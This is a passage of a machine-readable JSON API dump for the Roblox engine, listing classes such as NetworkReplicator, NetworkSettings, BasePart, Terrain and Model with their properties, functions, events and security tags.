],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestCharacter","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"SendMarker","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetPropSyncExpiration","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"lostConnection","Type":"bool"}],"Name":"Disconnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ClientReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"request","Default":null}],"Name":"RequestServerStats","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Function"},{"Arguments":[{"Name":"stats","Type":"Dictionary"}],"Name":"StatsReceived","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ServerReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"PreventTerrainChanges","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBasicFilteringEnabled","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"isAuthenticated","Type":"bool"},{"Name":"protocolVersion","Type":"int"}],"Name":"TicketProcessed","tags":[],"Class":"ServerReplicator","type":"Event"},{"ReturnType":"FilterResult","Arguments":[{"Name":"deletingItem","Type":"Instance"}],"Name":"DeleteFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"firingItem","Type":"Instance"},{"Name":"event","Type":"string"}],"Name":"EventFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"newItem","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"NewFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"changingItem","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"value","Type":"Variant"}],"Name":"PropertyFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"NetworkSettings","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"ArePhysicsRejectionsReported","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"CanSendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"ClientPhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataGCRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"DataMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"DataSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"EnableHeavyCompression","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ExperimentalPhysicsEnabled","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"ExtraMemoryUsed","tags":["PluginSecurity","hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryPoolMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"IncommingReplicationLag","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsQueueErrorComputed","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByCongestionControl","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByOutgoingBandwidthLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"MaxDataModelSendBuffer","tags":["deprecated"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"NetworkOwnerRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PhysicsMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsReceiveMethod","type":"Property","Name":"PhysicsReceive","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsSendMethod","type":"Property","Name":"PhysicsSend","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"PhysicsSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"PhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PreferredClientPort","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintBits","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintEvents","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintFilters","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintInstances","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintPhysicsErrors","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintProperties","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintSplitMessage","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintStreamInstanceQuota","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintTouches","tags":[],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"ReceiveRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"RenderStreamedRegions","tags":[],"Class":"NetworkSettings"},{"ValueType":"string","type":"Property","Name":"ReportStatURL","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"SendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowActiveAnimationAsset","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowPartMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"TotalNumMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"TouchSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackDataTypes","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackPhysicsDetails","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UseInstancePacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UsePhysicsPacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"WaitingForCharacterLogRate","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"Superclass":"Instance","type":"Class","Name":"NotificationService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"CancelAllNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null}],"Name":"CancelNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null},{"Type":"string","Name":"alertMsg","Default":null},{"Type":"int","Name":"minutesToFire","Default":null}],"Name":"ScheduleNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetScheduledNotifications","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"NumberValue","tags":[]},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"NumberValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"NumberValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"NumberValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ObjectValue","tags":[]},{"ValueType":"Object","type":"Property","Name":"Value","tags":[],"Class":"ObjectValue"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"Changed","tags":[],"Class":"ObjectValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"changed","tags":["deprecated"],"Class":"ObjectValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"OneQuarterClusterPacketCacheBase","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PVInstance","tags":["notbrowsable"]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","writeonly"],"Class":"PVInstance"},{"Superclass":"PVInstance","type":"Class","Name":"BasePart","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Anchored","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BackSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BackSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BottomSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BottomSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"BrickColor","tags":[],"Class":"BasePart"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"CanCollide","tags":[],"Class":"BasePart"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["deprecated"],"Class":"BasePart"},{"ValueType":"PhysicalProperties","type":"Property","Name":"CustomPhysicalProperties","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Elasticity","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Friction","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"FrontSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"FrontSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"LeftSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"LeftSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"Locked","tags":[],"Class":"BasePart"},{"ValueType":"Material","type":"Property","Name":"Material","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"ReceiveAge","tags":["hidden","readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Reflectance","tags":[],"Class":"BasePart"},{"ValueType":"int","type":"Property","Name":"ResizeIncrement","tags":["readonly"],"Class":"BasePart"},{"ValueType":"Faces","type":"Property","Name":"ResizeableFaces","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"RightSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"RightSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"RotVelocity","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"SpecificGravity","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"TopSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"TopSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"brickColor","tags":["deprecated"],"Class":"BasePart"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"CanSetNetworkOwnership","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"GetConnectedParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMass","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetRootPart","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetTouchingParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsGrounded","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"Resize","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"playerInstance","Default":"nil"}],"Name":"SetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"getMass","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"resize","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"Arguments":[{"Name":"part","Type":"Instance"}],"Name":"LocalSimulationTouched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[],"Name":"OutfitChanged","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"StoppedTouching","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"TouchEnded","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"Touched","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"touched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Superclass":"BasePart","type":"Class","Name":"CornerWedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"FormFactorPart","tags":[]},{"ValueType":"FormFactor","type":"Property","Name":"FormFactor","tags":["deprecated"],"Class":"FormFactorPart"},{"ValueType":"FormFactor","type":"Property","Name":"formFactor","tags":["deprecated","hidden"],"Class":"FormFactorPart"},{"Superclass":"FormFactorPart","type":"Class","Name":"Part","tags":[]},{"ValueType":"PartType","type":"Property","Name":"Shape","tags":[],"Class":"Part"},{"Superclass":"Part","type":"Class","Name":"FlagStand","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"FlagStand"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"FlagCaptured","tags":[],"Class":"FlagStand","type":"Event"},{"Superclass":"Part","type":"Class","Name":"Platform","tags":[]},{"Superclass":"Part","type":"Class","Name":"Seat","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"Seat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"Seat"},{"Superclass":"Part","type":"Class","Name":"SkateboardPlatform","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Controller","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"Object","type":"Property","Name":"ControllingHumanoid","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"bool","type":"Property","Name":"StickyWheels","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"SkateboardPlatform"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"impulseWorld","Default":null}],"Name":"ApplySpecificImpulse","tags":[],"Class":"SkateboardPlatform","type":"Function"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"newState","Type":"MoveState"},{"Name":"oldState","Type":"MoveState"}],"Name":"MoveStateChanged","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"Unequipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"equipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"unequipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Superclass":"Part","type":"Class","Name":"SpawnLocation","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowTeamChangeOnTouch","tags":[],"Class":"SpawnLocation"},{"ValueType":"int","type":"Property","Name":"Duration","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"SpawnLocation"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"SpawnLocation"},{"Superclass":"FormFactorPart","type":"Class","Name":"WedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"MeshPart","tags":[]},{"ValueType":"Material","type":"Property","Name":"Material","tags":["deprecated","readonly"],"Class":"MeshPart"},{"ValueType":"Content","type":"Property","Name":"TextureID","tags":[],"Class":"MeshPart"},{"Superclass":"BasePart","type":"Class","Name":"ParallelRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"PartOperation","tags":[]},{"ValueType":"bool","type":"Property","Name":"UsePartColor","tags":[],"Class":"PartOperation"},{"Superclass":"PartOperation","type":"Class","Name":"NegateOperation","tags":[]},{"Superclass":"PartOperation","type":"Class","Name":"UnionOperation","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"PrismPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PrismSides","type":"Property","Name":"Sides","tags":[],"Class":"PrismPart"},{"Superclass":"BasePart","type":"Class","Name":"PyramidPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PyramidSides","type":"Property","Name":"Sides","tags":[],"Class":"PyramidPart"},{"Superclass":"BasePart","type":"Class","Name":"RightAngleRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"Terrain","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Region3int16","type":"Property","Name":"MaxExtents","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Color3","type":"Property","Name":"WaterColor","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterTransparency","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSize","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSpeed","tags":[],"Class":"Terrain"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"AutowedgeCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"AutowedgeCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCenterToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCornerToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"Terrain","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"CopyRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"CountCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"center","Default":null},{"Type":"float","Name":"radius","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBall","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null},{"Type":"Vector3","Name":"size","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBlock","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"region","Default":null},{"Type":"Vector3int16","Name":"corner","Default":null},{"Type":"bool","Name":"pasteEmptyCells","Default":null}],"Name":"PasteRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null}],"Name":"ReadVoxels","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"WaterForce","Name":"force","Default":null},{"Type":"WaterDirection","Name":"direction","Default":null}],"Name":"SetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferEmpty","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferSolid","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Array","Name":"materials","Default":null},{"Type":"Array","Name":"occupancy","Default":null}],"Name":"WriteVoxels","tags":[],"Class":"Terrain","type":"Function"},{"Superclass":"BasePart","type":"Class","Name":"TrussPart","tags":[]},{"ValueType":"Style","type":"Property","Name":"Style","tags":[],"Class":"TrussPart"},{"Superclass":"BasePart","type":"Class","Name":"VehicleSeat","tags":[]},{"ValueType":"int","type":"Property","Name":"AreHingesDetected","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"HeadsUpDisplay","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"VehicleSeat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"VehicleSeat"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"Torque","tags":[],"Class":"VehicleSeat"},{"ValueType":"float","type":"Property","Name":"TurnSpeed","tags":[],"Class":"VehicleSeat"},{"Superclass":"PVInstance","type":"Class","Name":"Model","tags":[]},{"ValueType":"Object","type":"Property","Name":"PrimaryPart","tags":[],"Class":"Model"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetExtentsSize","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetModelCFrame","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetModelSize","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"MoveTo","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ResetOrientationToIdentity","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetIdentityOrientation","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null}],"Name":"SetPrimaryPartCFrame","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"delta","Default":null}],"Name":"TranslateBy","tags":[],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"move","tags":["deprecated"],"Class":"Model","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"location","Default":null}],"Name":"moveTo","tags":["deprecated"],"Class":"Model","type":"Function"},{"Superclass":"Model","type":"Class","Name":"RootInstance","tags":["notbrowsable"]},{"Superclass":"RootInstance","type":"Class","Name":"Workspace","